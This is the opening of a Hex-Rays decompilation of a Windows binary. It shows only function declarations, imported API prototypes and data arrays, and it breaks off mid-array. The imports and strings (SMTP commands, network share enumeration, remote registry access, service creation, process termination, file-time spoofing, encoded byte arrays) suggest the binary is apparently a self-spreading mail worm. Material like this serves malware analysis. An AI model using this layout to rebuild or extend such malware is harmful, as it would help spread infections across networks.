/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int __cdecl sub_401000(int a1, int a2, int a3, int a4);
LSTATUS sub_401198();
int __stdcall sub_401284(HKEY hKey, LPCSTR phkResult); // idb
int sub_4013A9();
int __stdcall sub_4013FA(DWORD th32ProcessID, int); // idb
void __stdcall __noreturn StartAddress(LPVOID lpThreadParameter);
void *__thiscall sub_40174B(void *this);
LPVOID __thiscall sub_40174E(int this, LPCSTR lpFileName, int a3, int a4);
HANDLE __thiscall sub_401808(int this);
void __cdecl sub_401841(char *Dest);
int __cdecl sub_4018E9(int a1);
void __cdecl sub_401A1E(char *Dest);
char *__cdecl sub_401E02(int a1, int a2, char *Dest);
char *__cdecl sub_40220C(int a1, char *Source);
char *__cdecl sub_402319(int Memory, char *Source);
char *__cdecl sub_40264B(char *Dest, char *Source, int a3);
int __cdecl sub_402680(_DWORD *a1);
int __cdecl sub_40284D(LPCSTR lpMachineName, int, char *hSCObject, HKEY hKey, int, int); // idb
int __thiscall sub_402C3B(void *this, char *Source, int a3, size_t Size, int a5);
int __thiscall sub_402D0D(int this);
int __thiscall sub_402D72(int this);
int __thiscall sub_402DCE(int this, int a2, int len);
int __thiscall sub_402EE0(SOCKET *this);
int __thiscall sub_402F9A(SOCKET *this, char *Str);
int __thiscall sub_403034(SOCKET *this, SOCKET a2);
void __stdcall sub_4030BF(int a1);
void *__thiscall sub_4030D4(int this, char *Str);
void *__thiscall sub_40317D(void *this, char *Str);
BOOL __thiscall sub_403222(SOCKET *this, int a2, __int16 a3, int a4);
int __thiscall sub_40326C(SOCKET *this, char *Str, int hostshort);
int __thiscall sub_4032CF(SOCKET *this, char *buf, int len, int flags);
int __thiscall sub_4032E6(SOCKET *this, char *buf, int len, int flags);
int __thiscall sub_4032FD(SOCKET *this);
int sub_40330B();
int __stdcall sub_40330F(char *Str, int); // idb
char __stdcall sub_4033A1(int a1, int a2);
int __cdecl sub_4033F4(char *Dest, char *Str, int, int); // idb
char *__cdecl sub_40347E(char *Str, int a2);
int __cdecl sub_4034AE(char *Str, int); // idb
int __cdecl sub_4034E0(char *Str, void *Dest, int); // idb
_BYTE *__cdecl sub_4035A1(int a1);
int __cdecl sub_4035D8(int a1, int a2, char *a3);
int __cdecl sub_403634(int a1, int a2, char *a3);
unsigned int __cdecl sub_403690(int a1);
int __cdecl sub_40372F(_BYTE *a1, int a2, int a3, int a4);
int __cdecl sub_403783(char a1);
int __cdecl sub_4037B9(char a1);
// BOOL __usercall sub_40380E@<eax>(HMODULE a1@<eax>);
BOOL __cdecl sub_40382F(_BYTE *a1);
char *__cdecl sub_403844(char *a1, _BYTE *a2, int a3, int a4, int a5, _DWORD *a6, int a7);
BOOL __cdecl sub_403A4F(LPCSTR lpFileName, char *Str, int a3, int a4, int a5);
int __cdecl sub_403BB8(int, int, char *Dest); // idb
int __cdecl sub_403C23(char a1);
int __cdecl sub_403C7D(char a1);
char *__cdecl sub_403C88();
char *__cdecl sub_403CE3(char *Dest, int a2);
int __cdecl sub_403D0C(char *Str); // idb
int __cdecl sub_403D4B(char *FullPath); // idb
int __cdecl sub_403DC6(LPCSTR NumberOfBytesWritten, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite); // idb
DWORD __cdecl sub_403E16(LPCSTR FileSizeHigh);
int __cdecl sub_403E63(LPCSTR lpFileName); // idb
void __cdecl sub_403E97(LPSTR lpFileName);
BOOL __cdecl sub_403F05(LPCSTR lpFileName);
int __cdecl sub_403F1C(char *Source, int, int); // idb
int __cdecl sub_40406E(LPCSTR lpFileName, LONG lDistanceToMove); // idb
BOOL __cdecl sub_404138(LPCSTR lpFileName, LPFILETIME lpCreationTime);
BOOL __cdecl sub_404180(LPCSTR lpFileName, FILETIME *lpCreationTime);
LPVOID __cdecl sub_4041C8(LPCSTR lpFileName, int a2, int a3);
void __cdecl sub_404261(void *Dest, int a2, int Source, int a4);
int __cdecl sub_4043D4(int, int, void *Dst, size_t Size, int); // idb
int __cdecl sub_404555(LPCSTR lpFileName, char *Dest, int, int); // idb
int __cdecl sub_4045EF(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE Dst, HKEY Size); // idb
int __cdecl sub_40464B(HKEY hKey, LPCSTR phkResult, LPCSTR lpValueName, BYTE *Str); // idb
int __cdecl sub_404691(HKEY hKey, LPCSTR lpSubKey, int, int); // idb
int __cdecl sub_40470F(HKEY hKey, LPCSTR lpSubKey, int, int); // idb
int __cdecl sub_4047B6(int a1);
HANDLE __cdecl sub_4047E2(LPCSTR lpApplicationName, LPSTR lpCommandLine);
const char *__cdecl sub_404825(LPCSTR lpFileName);
int __cdecl sub_4048B6(HKEY hKey, char *lpSubKey, LPCSTR Source, int, int); // idb
int __cdecl sub_40494A(HKEY hKey, char *Source, int, int, int); // idb
int sub_404A18();
__int16 *__cdecl sub_404B75(__int16 *a1, __int16 a2);
int __cdecl sub_404BD2(int, char *Dest, int); // idb
BOOL sub_404C49();
int __cdecl sub_404CC5(int a1, unsigned int a2);
_DWORD *__cdecl sub_404D04(int a1, unsigned int a2, unsigned int a3);
int __cdecl sub_404D74(int a1, int a2, int a3, unsigned int a4, unsigned int a5);
int __cdecl sub_404E1A(int, LPCSTR lpFileName, int); // idb
int __cdecl sub_404FC5(LPCSTR lpFileName, int); // idb
unsigned int __cdecl sub_4050B5(_WORD *a1, unsigned int a2);
_WORD *__cdecl sub_405108(LPCSTR lpFileName);
int __cdecl sub_405173(LPCSTR lpMultiByteStr); // idb
__int16 __cdecl sub_4051BE(unsigned __int8 *a1, int a2);
int __cdecl sub_405226(LPCSTR lpFileName, LPCVOID lpBuffer, char *Str, int); // idb
int sub_40542A();
int __cdecl sub_405449(HANDLE hObject, LPCSTR lpName); // idb
HANDLE __cdecl sub_405522(LPCSTR lpFileName);
int sub_4055FE();
const char *__cdecl sub_405705(LPCSTR lpFileName, char *Str1);
HMODULE sub_4057BE();
int __cdecl sub_405873(LPCSTR FullPath); // idb
int __cdecl sub_405B0F(char *lpFileName); // idb
int __cdecl sub_405C2E(char *Dest, int); // idb
int __cdecl sub_405C7A(char *lpFileName, int); // idb
int __cdecl sub_405E27(char *lpFileName, int, int); // idb
int __cdecl sub_405EC6(char *Source); // idb
int __cdecl sub_405F08(int, char *Source, int, int); // idb
void __stdcall __noreturn sub_406066(LPVOID lpThreadParameter);
BOOL __cdecl sub_4060AE(char *Source, int a2, int a3);
int __stdcall sub_406106(int a1);
int __cdecl sub_4061C0(char *Str, char *Dest); // idb
BOOL __cdecl sub_40620B(char *Memory, char *Str, int a3);
BOOL __cdecl sub_4062F0(int Memory, char *Str, int a3);
BOOL __cdecl sub_4063D4(char *Str, int a2);
int __cdecl sub_406426(char *Str); // idb
int sub_406552();
DWORD __stdcall sub_406608(LPVOID); // idb
// const char *__usercall sub_406A36@<eax>(int a1@<ebx>, LPCSTR lpMachineName, int a3);
DWORD __cdecl sub_406C65(LPNETRESOURCEA lpNetResource, DWORD hEnum, int a3);
void __stdcall __noreturn sub_406DDE(LPVOID lpThreadParameter);
int sub_406DFD();
DWORD __stdcall sub_406F88(LPVOID); // idb
DWORD __stdcall sub_406FD5(LPVOID); // idb
const char *__cdecl sub_40704C(LPCSTR lpFileName, int a2, int a3, int a4);
void __noreturn sub_4071C3();
DWORD __stdcall sub_4071CD(LPVOID); // idb
void __noreturn sub_4072F2();
void __stdcall HandlerProc(DWORD dwControl); // idb
void __stdcall sub_4073C3(int a1, int a2);
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
_DWORD *__cdecl sub_40745D(int a1, size_t a2, size_t *a3);
_BYTE *__cdecl sub_40756C(int *a1, unsigned int a2, size_t *a3);
// BOOL __stdcall Module32First(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// BOOL __stdcall Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
int __cdecl strcmp(const char *Str1, const char *Str2);
void *__cdecl memset(void *, int Val, size_t Size);
void sub_407750();
char *__cdecl strcat(char *Destination, const char *Source);
size_t __cdecl strlen(const char *Str);
void __cdecl _splitpath(const char *FullPath, char *Drive, char *Dir, char *Filename, char *Ext);
int __cdecl toupper_0(int C);
int __cdecl tolower_0(int C);
int sprintf(char *const Buffer, const char *const Format, ...);
void __cdecl sub_407BEB(LPVOID lpMem);
unsigned int __cdecl sub_407C00(unsigned int a1, _BYTE *a2, unsigned int a3);
int __cdecl sub_407F35(int a1);
int sub_407F3F();
void *__cdecl sub_407F8F(size_t a1);
int sscanf(const char *const Buffer, const char *const Format, ...);
unsigned int __cdecl sub_407FE0(unsigned int a1, _BYTE *a2, unsigned int a3);
int __cdecl isalpha(int C);
int __cdecl isdigit(int C);
int __cdecl isspace(int C);
char *__cdecl strstr(const char *Str, const char *SubStr);
int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
void __cdecl __noreturn _amsg_exit(DWORD NumberOfBytesWritten); // idb
void __cdecl __noreturn fast_error_exit(DWORD NumberOfBytesWritten); // idb
int __cdecl _setmbcp(int CodePage);
UINT __cdecl getSystemCP(UINT a1);
int __cdecl CPtoLCID(int a1);
int setSBCS();
unsigned int setSBUpLow();
int sub_40895B();
unsigned __int8 *__cdecl _mbsnbcpy(unsigned __int8 *Dest, const unsigned __int8 *Source, size_t Count);
int __cdecl __crtLCMapStringA(LCID Locale, DWORD dwMapFlags, LPCSTR lpSrcStr, int cchSrc, LPSTR lpDestStr, int cchDest, UINT CodePage, int); // idb
_BYTE *__cdecl strncnt(_BYTE *a1, _BYTE *a2);
int __cdecl _isctype(int C, int Type);
int __cdecl _flsbuf(int Ch, FILE *File);
int __cdecl _output(FILE *File, int, int); // idb
int __cdecl write_char(int, FILE *File, int); // idb
int __cdecl write_multi_char(int WCh, int a2, FILE *File, int a4);
int __cdecl write_string(int, int, FILE *File, int); // idb
int __cdecl sub_4095B9(_DWORD *a1);
__int64 __cdecl sub_4095C6(_DWORD *a1);
__int16 __cdecl sub_4095D6(_DWORD *a1);
void __cdecl free(void *Block);
void *__cdecl sub_409613(size_t a1);
void *__cdecl _nh_malloc(size_t Size, int a2);
void *__cdecl _heap_alloc(unsigned int a1);
int __cdecl _input(FILE *Stream, int, int); // idb
int __cdecl _hextodec(int C); // idb
int __cdecl sub_40A0E3(FILE *File);
int __cdecl sub_40A0FD(int Character, FILE *Stream);
int __cdecl _whiteout(int, FILE *Stream); // idb
void _cinit();
void __cdecl sub_40A239(UINT uExitCode);
void __cdecl sub_40A24A(UINT uExitCode);
void __cdecl doexit(UINT uExitCode, int a2, int a3);
void __cdecl sub_40A2F4(void (**a1)(void), unsigned int a2);
int __cdecl _XcptFilter(int, struct _EXCEPTION_POINTERS *ExceptionInfo); // idb
int *__cdecl xcptlookup(int a1);
_BYTE *_wincmdln();
void _setenvp();
int _setargv();
_DWORD *__cdecl parse_cmdline(unsigned __int8 *a1, unsigned __int8 **a2, unsigned __int8 *a3, _DWORD *a4, _DWORD *a5);
CHAR *__crtGetEnvironmentStringsA();
UINT _ioinit();
int __cdecl _heap_init(int a1);
void __cdecl __spoils<eax,ecx,edx> _global_unwind2(PVOID TargetFrame);
int __cdecl _unwind_handler(int a1, int a2, int a3, _DWORD *a4);
// int __usercall _local_unwind2@<eax>(int a1@<ebp>, int a2, int a3);
// int __userpurge sub_40ABE2@<eax>(int result@<eax>, int a2@<ebp>, int a3);
int __cdecl _except_handler3(int, PVOID TargetFrame, int);
int *_FF_MSGBANNER();
int *__cdecl _NMSG_WRITE(DWORD NumberOfBytesWritten);
BOOL __cdecl __crtGetStringTypeA(DWORD dwInfoType, LPCSTR lpSrcStr, int cchSrc, LPWORD lpCharType, UINT CodePage, LCID Locale, int a7);
char *__cdecl strncpy(char *Destination, const char *Source, size_t Count);
int __cdecl _lseek(int FileHandle, int Offset, int Origin);
int __cdecl _write(int, const void *, unsigned int);
int __cdecl _getbuf(_DWORD *a1);
int __cdecl _isatty(int FileHandle);
int __cdecl wctomb(char *, wchar_t);
int __sbh_heap_init();
char *__cdecl __sbh_find_block(int a1);
int __cdecl __sbh_free_block(_DWORD *a1, unsigned int a2);
_DWORD *__cdecl __sbh_alloc_block(int a1);
char *__sbh_alloc_new_region();
int __cdecl __sbh_alloc_new_group(_DWORD *a1);
BOOL __cdecl sub_40BDBE(int a1);
int __cdecl mbtowc(wchar_t *, const char *, size_t);
// int __usercall sub_40BEF0@<eax>(__int64 a1@<edx:eax>, unsigned __int8 a2@<cl>);
int __cdecl _filbuf(FILE *File);
int __cdecl ungetc_0(int Character, FILE *Stream);
int __cdecl sub_40C056(unsigned __int8 a1);
int __cdecl x_ismbbtype(unsigned __int8 a1, int a2, unsigned __int8 a3);
int __cdecl __crtMessageBoxA(int a1, int a2, int a3);
_DWORD *__cdecl _dosmaperr(unsigned int a1);
int __cdecl _free_osfhnd(int a1);
intptr_t __cdecl _get_osfhandle(int FileHandle);
void *__cdecl calloc(size_t Count, size_t Size);
int __cdecl fflush(FILE *Stream);
int __cdecl _flush(_DWORD *a1);
int sub_40C3AB();
int __cdecl flsall(int a1);
void sub_40C421();
int __cdecl _read(int, void *, unsigned int);
int __cdecl fclose(FILE *Stream);
int __cdecl _commit(int FileHandle);
int __cdecl _close(int FileHandle);
void __cdecl _freebuf(_iobuf *stream); // idb
// DWORD __stdcall WNetCloseEnum(HANDLE hEnum);
// DWORD __stdcall WNetEnumResourceA(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// DWORD __stdcall WNetOpenEnumA(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEA lpNetResource, LPHANDLE lphEnum);
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);
char *__cdecl _strupr(char *String);
int __cdecl _strnicmp(const char *String1, const char *String2, size_t MaxCount);
int __cdecl _strcmpi(const char *String1, const char *String2);
char *__cdecl _strlwr(char *String);
// SC_HANDLE __stdcall OpenSCManagerA(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// BOOL __stdcall StartServiceCtrlDispatcherA(const SERVICE_TABLE_ENTRYA *lpServiceStartTable);
// BOOL __stdcall LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);
// BOOL __stdcall AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
// LSTATUS __stdcall RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// LSTATUS __stdcall RegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// LSTATUS __stdcall RegCreateKeyA(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// LSTATUS __stdcall RegConnectRegistryA(LPCSTR lpMachineName, HKEY hKey, PHKEY phkResult);
// BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// BOOL __stdcall StartServiceA(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors);
// BOOL __stdcall AllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, DWORD nSubAuthority6, DWORD nSubAuthority7, PSID *pSid);
// BOOL __stdcall EqualSid(PSID pSid1, PSID pSid2);
// BOOL __stdcall GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
// SERVICE_STATUS_HANDLE __stdcall RegisterServiceCtrlHandlerA(LPCSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc);
// SC_HANDLE __stdcall OpenServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// PVOID __stdcall FreeSid(PSID pSid);
// BOOL __stdcall CloseServiceHandle(SC_HANDLE hSCObject);
// LSTATUS __stdcall RegEnumValueA(HKEY hKey, DWORD dwIndex, LPSTR lpValueName, LPDWORD lpcchValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// SC_HANDLE __stdcall CreateServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName, LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies, LPCSTR lpServiceStartName, LPCSTR lpPassword);
// LSTATUS __stdcall RegOpenKeyA(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// LSTATUS __stdcall RegEnumKeyA(HKEY hKey, DWORD dwIndex, LPSTR lpName, DWORD cchName);
// LSTATUS __stdcall RegDeleteValueA(HKEY hKey, LPCSTR lpValueName);
// BOOL __stdcall SetServiceStatus(SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus);
// LSTATUS __stdcall RegCloseKey(HKEY hKey);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// UINT __stdcall GetTempFileNameA(LPCSTR lpPathName, LPCSTR lpPrefixString, UINT uUnique, LPSTR lpTempFileName);
// int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// BOOL __stdcall CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// BOOL __stdcall SetFileAttributesA(LPCSTR lpFileName, DWORD dwFileAttributes);
// BOOL __stdcall FindClose(HANDLE hFindFile);
// BOOL __stdcall FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// BOOL __stdcall SetEndOfFile(HANDLE hFile);
// HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes);
// DWORD __stdcall GetTempPathA(DWORD nBufferLength, LPSTR lpBuffer);
// BOOL __stdcall DeleteFileA(LPCSTR lpFileName);
// int __stdcall WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// BOOL __stdcall CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// UINT __stdcall GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize);
// HANDLE __stdcall GetCurrentProcess();
// BOOL __stdcall SystemTimeToFileTime(const SYSTEMTIME *lpSystemTime, LPFILETIME lpFileTime);
// void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime);
// BOOL __stdcall GetVersionExA(LPOSVERSIONINFOA lpVersionInformation);
// DWORD __stdcall GetVersion();
// DWORD __stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
// LPSTR __stdcall GetCommandLineA();
// DWORD __stdcall ExpandEnvironmentStringsA(LPCSTR lpSrc, LPSTR lpDst, DWORD nSize);
// UINT __stdcall GetDriveTypeA(LPCSTR lpRootPathName);
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// DWORD __stdcall GetCurrentProcessId();
// void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// DWORD __stdcall GetLastError();
// DWORD __stdcall SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// BOOL __stdcall GetFileTime(HANDLE hFile, LPFILETIME lpCreationTime, LPFILETIME lpLastAccessTime, LPFILETIME lpLastWriteTime);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// HMODULE __stdcall LoadLibraryA_0(LPCSTR lpLibFileName);
// BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// HANDLE __stdcall CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// LPVOID __stdcall MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// BOOL __stdcall ReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
// HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT uExitCode);
// void __stdcall Sleep(DWORD dwMilliseconds);
// BOOL __stdcall SetFileTime(HANDLE hFile, const FILETIME *lpCreationTime, const FILETIME *lpLastAccessTime, const FILETIME *lpLastWriteTime);
// DWORD __stdcall GetTickCount();
// FARPROC __stdcall GetProcAddress_0(HMODULE hModule, LPCSTR lpProcName);
// int __stdcall LCMapStringW(LCID Locale, DWORD dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int cchDest);
// int __stdcall LCMapStringA(LCID Locale, DWORD dwMapFlags, LPCSTR lpSrcStr, int cchSrc, LPSTR lpDestStr, int cchDest);
// BOOL __stdcall FlushFileBuffers(HANDLE hFile);
// BOOL __stdcall SetStdHandle(DWORD nStdHandle, HANDLE hHandle);
// LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// BOOL __stdcall GetStringTypeW(DWORD dwInfoType, LPCWCH lpSrcStr, int cchSrc, LPWORD lpCharType);
// BOOL __stdcall GetStringTypeA(LCID Locale, DWORD dwInfoType, LPCSTR lpSrcStr, int cchSrc, LPWORD lpCharType);
// BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize);
// BOOL __stdcall HeapDestroy(HANDLE hHeap);
// DWORD __stdcall GetFileType(HANDLE hFile);
// HANDLE __stdcall GetStdHandle(DWORD nStdHandle);
// void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// BOOL __stdcall GetCPInfo(UINT CodePage, LPCPINFO lpCPInfo);
// UINT __stdcall GetACP();
// UINT __stdcall GetOEMCP();
// UINT __stdcall SetHandleCount(UINT uNumber);
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo);
// BOOL __stdcall FreeEnvironmentStringsA(LPCH penv);
// BOOL __stdcall FreeEnvironmentStringsW(LPWCH penv);
// LPCH __stdcall GetEnvironmentStrings();
// LPWCH __stdcall GetEnvironmentStringsW();
// struct hostent *__stdcall gethostbyname(const char *name);
// int __stdcall closesocket(SOCKET s);
// int __stdcall WSACleanup();
// int __stdcall recv(SOCKET s, char *buf, int len, int flags);
// int __stdcall send(SOCKET s, const char *buf, int len, int flags);
// u_short __stdcall htons(u_short hostshort);
// int __stdcall connect(SOCKET s, const struct sockaddr *name, int namelen);
// int __stdcall WSAGetLastError();
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
// SOCKET __stdcall socket(int af, int type, int protocol);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_40AB24; // weak
int dword_40D1F0[4] = { 0, 5, 0, 7 }; // idb
int dword_40D200 = 9; // weak
int dword_40D204[5] = { 5, 2, 2, 2, 2 }; // idb
_UNKNOWN unk_40D218; // weak
_UNKNOWN unk_40D228; // weak
CHAR byte_40D24C[4] = { '\0', '\0', '\0', '\0' }; // idb
WCHAR SrcStr = 0u; // idb
char byte_40D270[92] =
{
  '\x06',
  '\0',
  '\0',
  '\x06',
  '\0',
  '\x01',
  '\0',
  '\0',
  '\x10',
  '\0',
  '\x03',
  '\x06',
  '\0',
  '\x06',
  '\x02',
  '\x10',
  '\x04',
  'E',
  'E',
  'E',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '5',
  '0',
  '\0',
  'P',
  '\0',
  '\0',
  '\0',
  '\0',
  ' ',
  '(',
  '8',
  'P',
  'X',
  '\a',
  '\b',
  '\0',
  '7',
  '0',
  '0',
  'W',
  'P',
  '\a',
  '\0',
  '\0',
  ' ',
  ' ',
  '\b',
  '\0',
  '\0',
  '\0',
  '\0',
  '\b',
  '`',
  'h',
  '`',
  '`',
  '`',
  '`',
  '\0',
  '\0',
  'p',
  'p',
  'x',
  'x',
  'x',
  'x',
  '\b',
  '\a',
  '\b',
  '\0',
  '\0',
  '\a',
  '\0',
  '\b',
  '\b',
  '\b',
  '\0',
  '\0',
  '\b',
  '\0',
  '\b',
  '\0',
  '\a',
  '\b',
  '\0',
  '\0',
  '\0'
}; // idb
char aMicrosoftVisua[37] = "Microsoft Visual C++ Runtime Library"; // weak
char asc_40D598[] = "\n\n"; // idb
char aRuntimeErrorPr[26] = "Runtime Error!\n\nProgram: "; // weak
char asc_40D5B8[] = "..."; // idb
char aProgramNameUnk[23] = "<program name unknown>"; // weak
CHAR aGetlastactivep[] = "GetLastActivePopup"; // idb
CHAR aGetactivewindo[] = "GetActiveWindow"; // idb
CHAR aMessageboxa[] = "MessageBoxA"; // idb
CHAR aUser32Dll[] = "user32.dll"; // idb
void (*dword_40F000)(void) = NULL; // idb
_UNKNOWN unk_40F004; // weak
void (*off_40F008[3])(void) = { NULL, &sub_40895B, &sub_40B36F }; // idb
_UNKNOWN unk_40F014; // weak
void (*off_40F018[2])(void) = { NULL, &sub_40B414 }; // idb
_UNKNOWN unk_40F020; // weak
void (*dword_40F024)(void) = NULL; // idb
_UNKNOWN unk_40F028; // weak
void *off_40F030 = &unk_410D33; // weak
char Str2[2] = "@"; // idb
char Source[2] = " "; // idb
char asc_40F03C[2] = ","; // idb
char asc_40F040[3] = "--"; // idb
char asc_40F044[2] = "\\"; // idb
char buf[] = "QUIT\r\n"; // idb
char asc_40F050[] = "\r\n.\r\n"; // idb
char aData[] = "DATA \r\n"; // idb
char asc_40F06C[] = ">\r\n"; // idb
char Str[] = " \t\r\n"; // idb
char asc_40F098[] = ".,()%$@!`~ "; // idb
char asc_40F0A8[] = ".."; // idb
char asc_40F0AC[] = "."; // idb
char asc_40F0B0[] = "\\*.*"; // idb
char Str1[16] =
{
  '‰',
  '\x15',
  'w',
  'ï',
  '3',
  '\x19',
  '™',
  'x',
  '\x10',
  'X',
  '¸',
  'É',
  'ò',
  '™',
  '\0',
  '\0'
}; // idb
char byte_40F0D0[4] = { '\x02', 'ˆ', '\a', 'C' }; // idb
char aHhh[4] = "@HHH"; // weak
CHAR FileName[264] =
{
  'ˆ',
  '`',
  'ù',
  'É',
  'A',
  '5',
  '\x15',
  'A',
  '\r',
  '=',
  '\b',
  '‘',
  '-',
  '9',
  '\x1D',
  'E',
  'ù',
  '½',
  'Å',
  '±',
